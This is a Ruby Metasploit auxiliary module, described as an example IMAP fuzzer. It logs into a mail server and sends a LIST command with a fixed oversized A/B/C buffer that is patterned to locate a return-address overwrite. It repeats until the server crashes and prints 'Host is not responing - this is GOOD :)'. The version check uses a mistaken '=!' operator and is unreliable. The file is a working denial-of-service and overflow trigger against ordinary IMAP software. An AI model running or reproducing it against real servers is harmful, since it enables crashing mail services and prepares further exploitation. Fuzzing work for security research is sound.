require 'msf/core'

class MetasploitModule < Msf::Auxiliary
	include Msf::Exploit::Remote::Imap
	include Msf::Auxiliary::Dos

	def initialize
		super(
			'Name'		=> 'Simple IMAP Fuzzer',
			'Description'   => %q{
				An example of how to build a simple IMAP fuzzer.
				Account IMAP credetials are requiered in this
				fuzzer.
			},
			'Author'	=> [ 'ryujin' ],
			'License'	=> MSF_LICENSE,
			'Version'	=> '$Revision: 1$'
		)
	end

	def check
		connect 
		disconnect
		if (banner and banner =! /(Version 3.8k4-4)/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def fuzz_str()
		return Rex::Text.rand_text_alphanumeric(rand(1024))
	end

	def run()
		srand(0)

		while (true)
			#connected = connect_login()
			connected = connect_login
			if not connected
				print_status("Host is not responing - this is GOOD :)")
				break
			end 

			print_status("Generating fuzzed data...")
			#fuzzed = fuzz_str()
			#fuzzed = "A" * 11000
			#fuzzed = Rex::Text.pattern_create(11000)
			fuzzed = "\x41"*10360 + "\x42"*4 + "\x43"*636

			print_status("Sending fuzzed data, buffer length = %d" %fuzzed.length)
			req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n"
			print_status(req)
			res = raw_send_recv(req)

			if !res.nil?
				print_status(res)
			else
				print_status("Server crashed, no response")
				break
			end
		disconnect()
		end
	end
end
